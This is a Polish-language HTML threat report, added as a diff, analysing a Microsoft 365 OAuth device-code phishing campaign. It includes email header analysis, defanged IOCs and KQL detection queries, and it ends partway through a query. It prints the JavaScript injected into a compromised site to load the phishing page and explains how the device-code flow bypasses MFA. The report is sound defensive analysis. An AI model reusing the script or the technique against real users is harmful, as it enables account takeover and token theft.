@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>THREAT-012 - OAuth Device Code Phishing · Microsoft 365 Token Theft · Kwiecień 2026</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Epilogue:wght@400;500;700;900&display=swap');
+:root{--bg:#070a0f;--surface:#0c1119;--card:#0f1620;--border:#182438;--border2:#1e2e45;--cyan:#00d9f5;--green:#3dff8f;--red:#ff4560;--orange:#ff7b2c;--yellow:#ffd166;--purple:#c084fc;--blue:#4da6ff;--accent:#0078D4;--accent2:#2196f3;--text:#a8c0d6;--muted:#3a5472;--white:#e8f0f8;}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;line-height:1.6;}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 60% 40% at 10% 20%,rgba(0,120,212,.04) 0%,transparent 55%),radial-gradient(ellipse 50% 35% at 85% 75%,rgba(33,150,243,.02) 0%,transparent 55%),linear-gradient(rgba(0,120,212,.012) 1px,transparent 1px),linear-gradient(90deg,rgba(0,120,212,.012) 1px,transparent 1px);background-size:100% 100%,100% 100%,44px 44px,44px 44px;pointer-events:none;z-index:0;}
+.wrap{max-width:960px;margin:0 auto;padding:52px 24px 90px;position:relative;z-index:1;}
+.nav{display:flex;align-items:center;gap:16px;margin-bottom:48px;font-size:11px;}
+.nav a{color:var(--muted);text-decoration:none;transition:color .15s;}
+.nav a:hover{color:var(--accent);}
+.nav span{color:var(--border);}
+.eyebrow{font-size:10px;letter-spacing:3px;text-transform:uppercase;color:var(--accent);display:flex;align-items:center;gap:10px;margin-bottom:16px;}
+.eyebrow::before{content:'';width:24px;height:1px;background:var(--accent);box-shadow:0 0 6px var(--accent);}
+h1{font-family:'Epilogue',sans-serif;font-size:clamp(20px,4vw,38px);font-weight:900;color:var(--white);line-height:1.05;margin-bottom:20px;}
+h1 span{color:var(--accent);}
+.meta{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:6px;overflow:hidden;margin-bottom:32px;}
+.mc{background:var(--card);padding:11px 14px;}
+.ml{font-size:9px;letter-spacing:2px;text-transform:uppercase;color:var(--muted);margin-bottom:3px;}
+.mv{font-size:12px;font-weight:700;color:var(--white);}
+.mv.r{color:var(--red);}.mv.o{color:var(--orange);}.mv.g{color:var(--green);}.mv.c{color:var(--cyan);}.mv.y{color:var(--yellow);}.mv.a{color:var(--accent);}
+.notice{border-radius:6px;padding:14px 20px;margin-bottom:20px;display:flex;align-items:flex-start;gap:14px;font-size:12px;line-height:1.8;}
+.notice.orange{background:rgba(0,120,212,.04);border:1px solid rgba(0,120,212,.25);}
+.notice.red{background:rgba(255,69,96,.04);border:1px solid rgba(255,69,96,.2);}
+.notice.green{background:rgba(61,255,143,.04);border:1px solid rgba(61,255,143,.2);}
+.notice.cyan{background:rgba(0,217,245,.04);border:1px solid rgba(0,217,245,.2);}
+.notice.yellow{background:rgba(255,209,102,.04);border:1px solid rgba(255,209,102,.2);}
+.notice-icon{font-size:20px;flex-shrink:0;margin-top:2px;}
+.notice-body strong{color:var(--white);}
+.notice.orange .notice-body strong{color:var(--accent);}
+.notice.red .notice-body strong{color:var(--red);}
+.notice.green .notice-body strong{color:var(--green);}
+.notice.cyan .notice-body strong{color:var(--cyan);}
+.notice.yellow .notice-body strong{color:var(--yellow);}
+.sec{margin-bottom:36px;}
+.sl{font-size:9px;letter-spacing:3px;text-transform:uppercase;color:var(--accent);margin-bottom:12px;display:flex;align-items:center;gap:8px;}
+.sl::after{content:'';flex:1;height:1px;background:var(--border);}
+.sl.g{color:var(--green);}.sl.c{color:var(--cyan);}.sl.o{color:var(--orange);}.sl.y{color:var(--yellow);}.sl.r{color:var(--red);}
+p.pr{font-size:12px;color:var(--text);line-height:1.85;margin-bottom:12px;}
+p.pr strong{color:var(--white);}
+p.pr code{background:rgba(0,120,212,.08);border:1px solid rgba(0,120,212,.2);color:var(--accent);padding:1px 6px;border-radius:2px;font-size:11px;}
+.stage{background:var(--card);border:1px solid var(--border);border-radius:4px;overflow:hidden;margin-bottom:12px;}
+.stage-header{padding:12px 18px;display:flex;align-items:center;gap:12px;border-bottom:1px solid var(--border);}
+.stage-num{font-size:9px;font-weight:700;color:var(--white);background:var(--accent);padding:2px 8px;border-radius:2px;letter-spacing:1px;}
+.stage-num.r{background:var(--red);}
+.stage-num.g{background:var(--green);color:#000;}
+.stage-num.c{background:var(--cyan);color:#000;}
+.stage-num.y{background:var(--yellow);color:#000;}
+.stage-title{font-size:12px;font-weight:700;color:var(--white);}
+.stage-body{padding:14px 18px;font-size:12px;color:var(--text);line-height:1.8;}
+.stage-body code{background:rgba(0,120,212,.08);border:1px solid rgba(0,120,212,.15);color:var(--accent);padding:1px 6px;border-radius:2px;font-size:11px;}
+.stage-body .hl{color:var(--accent2);font-weight:700;}
+.stage-body .hl-r{color:var(--red);font-weight:700;}
+.stage-body .hl-g{color:var(--green);font-weight:700;}
+.code-wrap{position:relative;margin:12px 0;}
+.code-block{background:#020508;border:1px solid var(--border);border-radius:4px;padding:16px 18px;font-size:11px;line-height:1.8;overflow-x:auto;color:#a8c0d6;white-space:pre;}
+.code-block .kw{color:var(--cyan);}
+.code-block .fn{color:var(--yellow);}
+.code-block .str{color:var(--green);}
+.code-block .cm{color:var(--muted);font-style:italic;}
+.code-block .hl{color:var(--accent);font-weight:700;}
+.code-block .hl-r{color:var(--red);font-weight:700;}
+.it{width:100%;border-collapse:collapse;font-size:11px;margin-bottom:8px;}
+.it th{background:rgba(0,120,212,.06);border:1px solid var(--border);padding:8px 12px;text-align:left;font-size:9px;letter-spacing:2px;text-transform:uppercase;color:var(--accent);}
+.it td{border:1px solid var(--border);padding:9px 12px;color:var(--text);vertical-align:top;}
+.it tr:hover td{background:rgba(255,255,255,.015);}
+.ioc-d{color:var(--orange);word-break:break-all;}
+.bdg{display:inline-block;font-size:9px;padding:2px 7px;border-radius:2px;font-weight:700;letter-spacing:1px;text-transform:uppercase;}
+.bdg.r{background:rgba(255,69,96,.12);color:var(--red);border:1px solid rgba(255,69,96,.25);}
+.bdg.o{background:rgba(249,115,22,.12);color:var(--orange);border:1px solid rgba(249,115,22,.25);}
+.bdg.y{background:rgba(255,209,102,.12);color:var(--yellow);border:1px solid rgba(255,209,102,.25);}
+.bdg.g{background:rgba(61,255,143,.1);color:var(--green);border:1px solid rgba(61,255,143,.2);}
+.bdg.c{background:rgba(0,217,245,.1);color:var(--cyan);border:1px solid rgba(0,217,245,.2);}
+.mg{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;}
+.mc2{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:12px 14px;}
+.mid{font-size:10px;font-weight:700;color:var(--accent);margin-bottom:4px;}
+.mname{font-size:12px;color:var(--white);margin-bottom:4px;}
+.mtactic{font-size:10px;color:var(--muted);}
+.box{border-radius:6px;padding:14px 18px;font-size:12px;line-height:1.8;margin-bottom:14px;}
+.box.blue{background:rgba(0,120,212,.04);border:1px solid rgba(0,120,212,.15);border-left:3px solid var(--accent);}
+.box.red{background:rgba(255,69,96,.04);border:1px solid rgba(255,69,96,.15);border-left:3px solid var(--red);}
+.box.green{background:rgba(61,255,143,.04);border:1px solid rgba(61,255,143,.15);border-left:3px solid var(--green);}
+.box strong{color:var(--white);}
+.box code{background:rgba(255,255,255,.06);padding:1px 6px;border-radius:2px;font-size:11px;color:var(--yellow);}
+.tl{position:relative;padding-left:24px;margin-bottom:8px;}
+.tl::before{content:'';position:absolute;left:0;top:0;bottom:0;width:1px;background:var(--border);}
+.tl-item{position:relative;margin-bottom:14px;font-size:12px;}
+.tl-item::before{content:'';position:absolute;left:-28px;top:6px;width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 6px var(--accent);}
+.tl-item.g::before{background:var(--green);box-shadow:0 0 6px var(--green);}
+.tl-item.r::before{background:var(--red);box-shadow:0 0 6px var(--red);}
+.tl-item.c::before{background:var(--cyan);box-shadow:0 0 6px var(--cyan);}
+.tl-time{font-size:10px;color:var(--muted);margin-bottom:2px;}
+.tl-desc{color:var(--text);}
+.tl-desc strong{color:var(--white);}
+footer{border-top:1px solid var(--border);padding-top:20px;margin-top:48px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px;font-size:10px;color:var(--muted);}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<nav class="nav">
+  <a href="index.html">← Portfolio</a>
+  <span>/</span>
+  <a href="kql-library.html">KQL Library</a>
+  <span>/</span>
+  <span style="color:var(--accent)">THREAT-012</span>
+</nav>
+
+<div class="eyebrow">Threat Research · Phishing Analysis · OAuth Abuse</div>
+<h1>OAuth Device Code Phishing<br><span>Microsoft 365 Token Theft via Skompromitowanej Infrastruktury</span></h1>
+
+<div class="meta">
+  <div class="mc"><div class="ml">ID</div><div class="mv a">THREAT-012</div></div>
+  <div class="mc"><div class="ml">Data</div><div class="mv">21 Apr 2026</div></div>
+  <div class="mc"><div class="ml">Typ</div><div class="mv r">OAuth Phishing</div></div>
+  <div class="mc"><div class="ml">Wektor</div><div class="mv o">Email / AiTM</div></div>
+  <div class="mc"><div class="ml">Cel</div><div class="mv">Microsoft 365</div></div>
+  <div class="mc"><div class="ml">Severity</div><div class="mv r">High</div></div>
+  <div class="mc"><div class="ml">MFA Bypass</div><div class="mv r">Tak</div></div>
+  <div class="mc"><div class="ml">Status</div><div class="mv y">Aktywna kampania</div></div>
+</div>
+
+<div class="notice red">
+  <div class="notice-icon">🔴</div>
+  <div class="notice-body"><strong>Bypass MFA</strong><br>
+  Ten atak <strong>omija uwierzytelnianie wieloskładnikowe</strong>. Ofiara autoryzuje aplikację atakującego przez prawdziwy portal Microsoft - tokeny OAuth uzyskane w ten sposób są ważne niezależnie od włączonego MFA i przeżywają zmianę hasła. Klasyczna ochrona przed phishingiem jest tu nieskuteczna.
+  </div>
+</div>
+
+<div class="notice orange">
+  <div class="notice-icon">⚠️</div>
+  <div class="notice-body"><strong>Kompromitacja legitymnej infrastruktury</strong><br>
+  Email phishingowy przeszedł weryfikację DKIM i DMARC, ponieważ atakujący przejął konto SendGrid firmy <strong>arterexmedical[.]com</strong> - prawdziwej firmy medycznej. Standardowe filtry antyphishingowe oparte na reputacji domeny nie wykryją tego ataku.
+  </div>
+</div>
+
+<!-- EXECUTIVE SUMMARY -->
+<div class="sec">
+<div class="sl">Executive Summary</div>
+<p class="pr">W dniu 21 kwietnia 2026 roku odnotowano próbę phishingową wymierzoną w użytkownika firmowego Microsoft 365. Atak wykorzystuje <strong>OAuth Device Code Flow</strong> (RFC 8628) - legalny mechanizm autoryzacji zaprojektowany dla urządzeń IoT - do wyłudzenia tokenów dostępu do konta Microsoft bez konieczności przechwytywania hasła lub kodu MFA.</p>
+<p class="pr">Łańcuch ataku składa się z trzech warstw: fałszywy email powiadomienia Teams dostarczony przez skompromitowane konto SendGrid (<code>arterexmedical[.]com</code>), przekierowanie przez skompromitowaną stronę singapurską (<code>leoch[.]sg</code>), oraz fałszywy interfejs Teams hostowany na <strong>Cloudflare Workers</strong>. Kulminacją jest wyświetlenie ofierze kodu urządzenia i nakłonienie jej do autoryzacji go na prawdziwej stronie Microsoft - co oddaje atakującemu pełny dostęp do konta przez access token i 90-dniowy refresh token.</p>
+</div>
+
+<!-- KILL CHAIN -->
+<div class="sec">
+<div class="sl">Łańcuch ataku - 3 etapy</div>
+
+<div class="stage">
+  <div class="stage-header"><div class="stage-num">01</div><div class="stage-title">Email Delivery - kompromitacja SendGrid arterexmedical[.]com</div></div>
+  <div class="stage-body">
+    Email nadawany jest z <code>info[@]arterexmedical[.]com</code> - legitymnej firmy medycznej, której konto SendGrid zostało przejęte przez atakującego. Dzięki temu email przechodzi weryfikację <span class="hl-g">DKIM PASS</span> i <span class="hl-g">DMARC PASS</span>, trafiając do skrzynki ofiary bez ostrzeżeń.<br><br>
+    Rzeczywisty nadawca: <code>168.245.102.229</code> (SendGrid - <code>xvfrsszr.outbound-mail.sendgrid[.]net</code>), routowany przez Mimecast UK (<code>91.220.42.227</code>). SPF pada na poziomie Microsoft (<span class="hl-r">FAIL</span>), ale DMARC jest spełniony przez alignment DKIM - email zostaje dostarczony.<br><br>
+    <strong>Treść emaila:</strong> imitacja powiadomienia Microsoft Teams - <em>"Hi [imię], please take a look at the shared document and provide your feedback when you get a chance."</em> z przyciskiem Open Message.
+  </div>
+</div>
+
+<div class="stage">
+  <div class="stage-header"><div class="stage-num">02</div><div class="stage-title">Redirect Chain - leoch[.]sg → Cloudflare Workers</div></div>
+  <div class="stage-body">
+    Kliknięcie przycisku uruchamia łańcuch przekierowań:<br><br>
+    <code>SendGrid tracking URL</code> → <code>hxxps://leoch[.]sg/about-us/#[email-ofiary]</code> → <code>hxxps://secure-link-ek3t[.]c-kzevzz5a[.]workers[.]dev/l/7vmjNVmDDOs#[email-ofiary]</code><br><br>
+    Domena <strong>leoch[.]sg</strong> należy do singapurskiego producenta baterii - prawdopodobnie skompromitowany WordPress lub skradzione dane dostępowe. Na stronie osadzony jest minimalistyczny JavaScript inicjujący fetch do właściwej infrastruktury phishingowej po 2-sekundowym opóźnieniu, symulującym ładowanie Teams.<br><br>
+    Email ofiary przekazywany jest w <span class="hl">hash URL</span> (<code>#email@domain.com</code>) - fragment nie jest wysyłany do serwera, co utrudnia detekcję przez URL scanery.
+  </div>
+</div>
+
+<div class="stage">
+  <div class="stage-header"><div class="stage-num r">03</div><div class="stage-title">OAuth Device Code Abuse - wyłudzenie tokenu Microsoft 365</div></div>
+  <div class="stage-body">
+    Strona Cloudflare Workers wyświetla fałszywy interfejs Microsoft Teams z komunikatem o udostępnionym pliku Excel oraz <strong>kodem weryfikacyjnym</strong> (<code>GWX74K3UC</code>). Instrukcje nakłaniają ofiarę do kliknięcia <em>"Open File"</em>, co otwiera prawdziwy portal Microsoft (<code>login[.]microsoftonline[.]com/common/oauth2/deviceauth</code>).<br><br>
+    Po wpisaniu kodu ofiara widzi: <em>"Logujesz się do aplikacji <strong>Microsoft Office</strong> na innym urządzeniu znajdującym się w lokalizacji <span class="hl-r">Stany Zjednoczone</span>."</em> Akceptując - nieświadomie autoryzuje aplikację atakującego, który w tym momencie odbiera <strong>access token</strong> (1h) oraz <strong>refresh token</strong> (90 dni).
+  </div>
+</div>
+</div>
+
+<!-- EMAIL HEADERS -->
+<div class="sec">
+<div class="sl c">Analiza nagłówków email</div>
+<p class="pr"><strong>Weryfikacja autentyczności nadawcy - paradoks SPF/DKIM/DMARC:</strong></p>
+
+<table class="it">
+  <thead><tr><th>Mechanizm</th><th>Wynik</th><th>Szczegóły</th></tr></thead>
+  <tbody>
+    <tr><td><strong>DKIM</strong></td><td><span class="bdg g">PASS</span></td><td>Sygnatura zweryfikowana dla arterexmedical[.]com (selektor: s1)</td></tr>
+    <tr><td><strong>DMARC</strong></td><td><span class="bdg g">PASS</span></td><td>Policy: reject, alignment via DKIM - email dostarczony mimo SPF fail</td></tr>
+    <tr><td><strong>SPF (Microsoft)</strong></td><td><span class="bdg r">FAIL</span></td><td>IP 91.220.42.227 (Mimecast) nie autoryzowany przez arterexmedical[.]com</td></tr>
+    <tr><td><strong>SPF (Mimecast)</strong></td><td><span class="bdg g">PASS</span></td><td>SendGrid IP 168.245.102.229 autoryzowany w rekordzie SPF</td></tr>
+    <tr><td><strong>compauth</strong></td><td><span class="bdg g">PASS reason=100</span></td><td>Microsoft composite authentication - email nie oznaczony jako spam</td></tr>
+  </tbody>
+</table>
+
+<div class="notice cyan">
+  <div class="notice-icon">🔍</div>
+  <div class="notice-body"><strong>Kluczowy insight - dlaczego DMARC przeszedł mimo SPF fail?</strong><br>
+  DMARC wymaga alignment <em>albo</em> SPF <em>albo</em> DKIM z domeną From:. Atakujący, kompromitując konto SendGrid firmy arterexmedical[.]com, uzyskał dostęp do kluczy prywatnych DKIM tej domeny - co pozwoliło podpisać email ważną sygnaturą. SPF padło (inny IP), ale DKIM alignment wystarczył do spełnienia polityki DMARC. <strong>To właśnie dlatego kompromitacja legitymnej domeny jest cenniejsza niż spoofing.</strong>
+  </div>
+</div>
+
+<p class="pr"><strong>Ścieżka dostarczenia emaila:</strong></p>
+<div class="code-wrap"><pre class="code-block"><span class="cm">// Received: chain - rekonstrukcja trasy emaila</span>
+<span class="hl">SendGrid</span>        168.245.102.229   xvfrsszr.outbound-mail.sendgrid[.]net
+  <span class="fn">↓</span>
+<span class="hl">Mimecast UK</span>     91.220.42.227     eu-smtp-inbound-delivery-1.mimecast[.]com
+  <span class="fn">↓</span>
+<span class="hl">Microsoft O365</span>  protection.outlook[.]com  →  EURP194.PROD.OUTLOOK.COM
+  <span class="fn">↓</span>
+<span class="hl">Skrzynka ofiary</span> [REDACTED]</pre></div>
+</div>
+
+<!-- INFRASTRUCTURE -->
+<div class="sec">
+<div class="sl o">Infrastruktura phishingowa</div>
+
+<div class="stage">
+  <div class="stage-header"><div class="stage-num c">INF-1</div><div class="stage-title">leoch[.]sg - skompromitowana strona korporacyjna</div></div>
+  <div class="stage-body">
+    Leoch International Technology Limited to rzeczywisty singapurski producent baterii. Strona najprawdopodobniej oparta na WordPressie z niezaktualizowanymi pluginami lub skradzionymi danymi dostępowymi. Atakujący wstrzyknął minimalny JavaScript do strony <code>/about-us/</code>, który po 2 sekundach wykonuje fetch do głównej infrastruktury phishingowej i nadpisuje zawartość strony odpowiedzią - technika pozwalająca uniknąć przekierowania widocznego w pasku adresu.
+  </div>
+</div>
+
+<div class="stage">
+  <div class="stage-header"><div class="stage-num c">INF-2</div><div class="stage-title">Cloudflare Workers - hosting strony phishingowej</div></div>
+  <div class="stage-body">
+    Właściwa strona phishingowa hostowana na <code>secure-link-ek3t[.]c-kzevzz5a[.]workers[.]dev</code>. Cloudflare Workers popularyzowane przez atakujących ze względu na: darmowy certyfikat TLS (brak red flagi w przeglądarce), trudność takiedownu (wymaga raportu nadużycia do Cloudflare), natychmiastowy redeploy po usunięciu oraz losowy subdomain (<code>c-kzevzz5a</code>) utrudniający blokadę.<br><br>
+    <strong>Źródło - JavaScript redirect z leoch[.]sg:</strong>
+    <div class="code-wrap"><pre class="code-block"><span class="kw">var</span> lp=<span class="str">'hxxps://secure-link-ek3t[.]c-kzevzz5a[.]workers[.]dev/lp/7vmjNVmDDOs'</span>;
+<span class="fn">setTimeout</span>(<span class="kw">function</span>(){
+  <span class="fn">fetch</span>(lp,{credentials:<span class="str">'same-origin'</span>,headers:{<span class="str">'Accept'</span>:<span class="str">'text/html'</span>},referrer:location.href})
+  .then(<span class="kw">function</span>(r){<span class="kw">return</span> r.<span class="fn">text</span>()})
+  .then(<span class="kw">function</span>(d){document.<span class="fn">open</span>();document.<span class="fn">write</span>(d);document.<span class="fn">close</span>()})
+  .<span class="fn">catch</span>(<span class="kw">function</span>(){location.<span class="fn">reload</span>();});
+},<span class="hl">2000</span>); <span class="cm">// 2s delay symuluje ładowanie Teams</span></pre></div>
+  </div>
+</div>
+</div>
+
+<!-- OAUTH MECHANISM -->
+<div class="sec">
+<div class="sl r">Mechanizm OAuth Device Code Flow Abuse</div>
+
+<p class="pr"><strong>Legalny Device Code Flow (RFC 8628) - punkt wyjścia:</strong></p>
+<p class="pr">Mechanizm zaprojektowany dla urządzeń bez przeglądarki (smart TV, CLI, IoT). Urządzenie generuje kod przez API Microsoft i wyświetla go użytkownikowi, który wpisuje go na <code>microsoft.com/devicelogin</code> z osobnego urządzenia. Po autoryzacji urządzenie odbiera token. <strong>Kluczowa luka: brak mechanizmu weryfikacji, co faktycznie autoryzuje użytkownik.</strong></p>
+
+<div class="stage">
+  <div class="stage-header"><div class="stage-num">01</div><div class="stage-title">Generowanie kodu urządzenia przez atakującego</div></div>
+  <div class="stage-body">
+    Atakujący rejestruje aplikację w Azure AD (lub przejmuje istniejącą) i odpytuje Microsoft o device code. W odpowiedzi otrzymuje <code>device_code</code> (dla serwera) oraz <code>user_code</code> (dla ofiary). Jednocześnie rozpoczyna cykliczne odpytywanie endpointu tokenowego - czekając aż ofiara autoryzuje kod.
+  </div>
+</div>
+
+<div class="stage">
+  <div class="stage-header"><div class="stage-num">02</div><div class="stage-title">Wyświetlenie kodu ofierze - fałszywy interfejs Teams</div></div>
+  <div class="stage-body">
+    Strona Workers wyświetla <code>user_code</code> (<span class="hl">GWX74K3UC</span>) jako "Verification code" z instrukcjami krok po kroku. Całość oprawiona jest w realistyczny interfejs Teams z ikoną Excel i fikcyjną wiadomością o udostępnionym dokumencie - budując zaufanie i poczucie pilności.
+  </div>
+</div>
+
+<div class="stage">
+  <div class="stage-header"><div class="stage-num r">03</div><div class="stage-title">Autoryzacja na prawdziwej stronie Microsoft</div></div>
+  <div class="stage-body">
+    Kliknięcie <em>"Open File"</em> otwiera <span class="hl-g">legalną stronę Microsoft</span> (<code>login[.]microsoftonline[.]com/common/oauth2/deviceauth</code>). Ofiara loguje się swoimi danymi - włącznie z MFA - i wpisuje kod. Widoczny komunikat: <em>"Logujesz się do aplikacji <strong>Microsoft Office</strong> na innym urządzeniu znajdującym się w lokalizacji <span class="hl-r">Stany Zjednoczone</span>."</em><br><br>
+    Geolokacja USA wskazuje lokalizację serwera atakującego. Nazwa "Microsoft Office" to prawdopodobnie fałszywa lub przejęta rejestracja aplikacji w Azure AD.
+  </div>
+</div>
+
+<div class="stage">
+  <div class="stage-header"><div class="stage-num g">04</div><div class="stage-title">Odbiór tokenów - pełny dostęp do konta</div></div>
+  <div class="stage-body">
+    W momencie zatwierdzenia przez ofiarę serwer atakującego odbiera:<br><br>
+    <strong>Access Token</strong> - ważny 1h, natychmiastowy dostęp do Microsoft Graph API (email, pliki, Teams, kontakty)<br>
+    <strong>Refresh Token</strong> - ważny <span class="hl-r">90 dni</span> domyślnie, pozwala na ciągłe odnawianie dostępu. <strong>Przeżywa zmianę hasła.</strong><br><br>
+    Zakres uprawnień zależy od rejestracji aplikacji: prawdopodobnie <code>Mail.ReadWrite</code>, <code>Files.ReadWrite.All</code>, <code>Contacts.Read</code>, <code>User.Read</code>.
+  </div>
+</div>
+
+<div class="notice yellow">
+  <div class="notice-icon">💡</div>
+  <div class="notice-body"><strong>Dlaczego MFA nie pomaga?</strong><br>
+  MFA chroni przed kradzieżą hasła. W tym ataku ofiara <em>samodzielnie</em> przechodzi przez pełny proces uwierzytelniania - włącznie z MFA - na prawdziwej stronie Microsoft. Atakujący nie przechwytuje kodu MFA ani sesji cookie. Uzyskuje token OAuth, który jest już wynikiem zakończonego uwierzytelniania.
+  </div>
+</div>
+</div>
+
+<!-- TIMELINE -->
+<div class="sec">
+<div class="sl y">Oś czasu - 21 kwietnia 2026</div>
+<div class="tl">
+  <div class="tl-item">
+    <div class="tl-time">21 Apr 2026 · 12:02:58 UTC</div>
+    <div class="tl-desc">Email phishingowy wysłany z SendGrid przez <strong>arterexmedical[.]com</strong>, zaadresowany do <strong>[REDACTED]</strong></div>
+  </div>
+  <div class="tl-item">
+    <div class="tl-time">21 Apr · 13:02:59 UTC+1</div>
+    <div class="tl-desc">Email routowany przez <strong>Mimecast UK</strong> - DKIM i DMARC PASS, SPF FAIL odnotowany ale niezablokowany</div>
+  </div>
+  <div class="tl-item">
+    <div class="tl-time">21 Apr · 12:03:01 UTC</div>
+    <div class="tl-desc">Dostarczenie do <strong>Microsoft 365</strong> (EURP194.PROD.OUTLOOK.COM) - compauth PASS reason=100</div>
+  </div>
+  <div class="tl-item c">
+    <div class="tl-time">21 Apr · po dostarczeniu</div>
+    <div class="tl-desc">Ofiara klika <strong>Open Message</strong> → redirect przez leoch[.]sg → Cloudflare Workers - wyświetlony interfejs Teams z kodem <span style="color:var(--red);font-weight:700;">GWX74K3UC</span></div>
+  </div>
+  <div class="tl-item r">
+    <div class="tl-time">21 Apr · interakcja</div>
+    <div class="tl-desc">Otwarty panel Microsoft OAuth Device Auth - widoczne: aplikacja "Microsoft Office", lokalizacja <strong>Stany Zjednoczone</strong></div>
+  </div>
+  <div class="tl-item g">
+    <div class="tl-time">21 Apr · detekcja</div>
+    <div class="tl-desc">Email zgłoszony przez ofiarę przez <strong>PhishAlarm Add-In</strong> (header: X-PhishAlarm-Format). Analiza przeprowadzona przez zespół bezpieczeństwa</div>
+  </div>
+</div>
+</div>
+
+<!-- IOC -->
+<div class="sec">
+<div class="sl r">Indicators of Compromise</div>
+
+<p class="pr"><strong>Infrastruktura email:</strong></p>
+<table class="it">
+  <thead><tr><th>Typ</th><th>Wartość</th><th>Kontekst</th></tr></thead>
+  <tbody>
+    <tr><td>Nadawca</td><td><span class="ioc-d">info[@]arterexmedical[.]com</span></td><td>Skompromitowane konto - legitymna firma medyczna</td></tr>
+    <tr><td>Return-Path</td><td><span class="ioc-d">bounces+8116708-f706-*[@]em1198[.]arterexmedical[.]com</span></td><td>SendGrid campaign ID: 8116708-f706</td></tr>
+    <tr><td>IP nadawcy</td><td><span class="ioc-d">168.245.102.229</span></td><td>SendGrid outbound - xvfrsszr.outbound-mail.sendgrid[.]net</td></tr>
+    <tr><td>IP relay</td><td><span class="ioc-d">91.220.42.227</span></td><td>Mimecast UK - eu-smtp-inbound-delivery-1.mimecast[.]com</td></tr>
+    <tr><td>Message-ID</td><td><span class="ioc-d">40c50761-7a94-75bf-c0f0-5113fb441e03[@]arterexmedical[.]com</span></td><td>Unikalny identyfikator wiadomości</td></tr>
+  </tbody>
+</table>
+
+<p class="pr" style="margin-top:16px;"><strong>Infrastruktura phishingowa:</strong></p>
+<table class="it">
+  <thead><tr><th>Typ</th><th>Wartość</th><th>Kontekst</th></tr></thead>
+  <tbody>
+    <tr><td>Landing Page</td><td><span class="ioc-d">hxxps://leoch[.]sg/about-us/</span></td><td>Skompromitowana strona singapurskiego producenta baterii</td></tr>
+    <tr><td>Phishing Worker</td><td><span class="ioc-d">hxxps://secure-link-ek3t[.]c-kzevzz5a[.]workers[.]dev/</span></td><td>Cloudflare Workers - fałszywy interfejs Teams</td></tr>
+    <tr><td>Worker subdomain</td><td><span class="ioc-d">c-kzevzz5a[.]workers[.]dev</span></td><td>Losowy subdomain utrudniający blokadę po domenie</td></tr>
+    <tr><td>Ścieżka tracking</td><td><span class="ioc-d">/l/7vmjNVmDDOs</span></td><td>Zakodowany identyfikator kampanii/ofiary</td></tr>
+  </tbody>
+</table>
+
+<p class="pr" style="margin-top:16px;"><strong>Artefakty OAuth:</strong></p>
+<table class="it">
+  <thead><tr><th>Typ</th><th>Wartość</th><th>Kontekst</th></tr></thead>
+  <tbody>
+    <tr><td>Device Code (przykład)</td><td><span class="ioc-d">GWX74K3UC</span></td><td>8-znakowy kod alfanumeryczny wyświetlony ofierze</td></tr>
+    <tr><td>OAuth Endpoint</td><td><span class="ioc-d">hxxps://login[.]microsoftonline[.]com/common/oauth2/deviceauth</span></td><td>Legalny endpoint Microsoft - używany przez atakującego</td></tr>
+    <tr><td>Nazwa aplikacji</td><td><span class="ioc-d">Microsoft Office</span></td><td>Prawdopodobnie fałszywa lub przejęta rejestracja Azure AD</td></tr>
+    <tr><td>Geolokacja auth</td><td><span class="ioc-d">United States</span></td><td>Lokalizacja serwera atakującego (polling tokenów)</td></tr>
+  </tbody>
+</table>
+</div>
+
+<!-- DETECTION -->
+<div class="sec">
+<div class="sl r">Detekcja</div>
+<p class="pr"><strong>Microsoft Sentinel / Entra ID - KQL: Device Code Flow z nieoczekiwanej lokalizacji:</strong></p>
+<div class="code-wrap"><pre class="code-block"><span class="cm">// [HIGH] OAuth Device Code Flow - uwierzytelnienie spoza oczekiwanej lokalizacji</span>
+<span class="cm">// MITRE: T1528 · T1550.001</span>
+<span class="kw">SigninLogs</span>
+<span class="op">|</span> <span class="fn">where</span> TimeGenerated <span class="op">></span> <span class="fn">ago</span>(30d)
+<span class="op">|</span> <span class="fn">where</span> AuthenticationProtocol <span class="op">==</span> <span class="str">"deviceCode"</span>
+<span class="op">|</span> <span class="fn">extend</span> Country <span class="op">=</span> <span class="fn">tostring</span>(LocationDetails.countryOrRegion)
+<span class="op">|</span> <span class="fn">where</span> Country <span class="op">!in</span> (<span class="str">"Poland"</span>, <span class="str">"Germany"</span>)  <span class="cm">// dostosuj do swojego środowiska</span>
+<span class="op">|</span> <span class="fn">where</span> ResultType <span class="op">==</span> 0
+<span class="op">|</span> <span class="fn">project</span>
+    TimeGenerated,
+    UserPrincipalName,
+    AppDisplayName,
+    Country,
+    IPAddress,
+    DeviceDetail,
+    ResultType
+<span class="op">|</span> <span class="fn">order by</span> TimeGenerated <span class="fn">desc</span></pre></div>
+
+<p class="pr" style="margin-top:16px;"><strong>Microsoft Sentinel - KQL: Nowe OAuth consent granty z szerokim zakresem:</strong></p>
+<div class="code-wrap"><pre class="code-block"><span class="cm">// [MEDIUM] Nowe zgody OAuth dla aplikacji z szerokim zakresem uprawnień</span>
+<span class="cm">// MITRE: T1528 · T1098.001</span>
+<span class="kw">AuditLogs</span>
+<span class="op">|</span> <span class="fn">where</span> TimeGenerated <span class="op">></span> <span class="fn">ago</span>(7d)
+<span class="op">|</span> <span class="fn">where</span> OperationName <span class="op">==</span> <span class="str">"Consent to application"</span>
+<span class="op">|</span> <span class="fn">extend</span> AppName <span class="op">=</span> <span class="fn">tostring</span>(TargetResources[0].displayName)
+<span class="op">|</span> <span class="fn">extend</span> Permissions <span class="op">=</span> <span class="fn">tostring</span>(TargetResources[0].modifiedProperties)
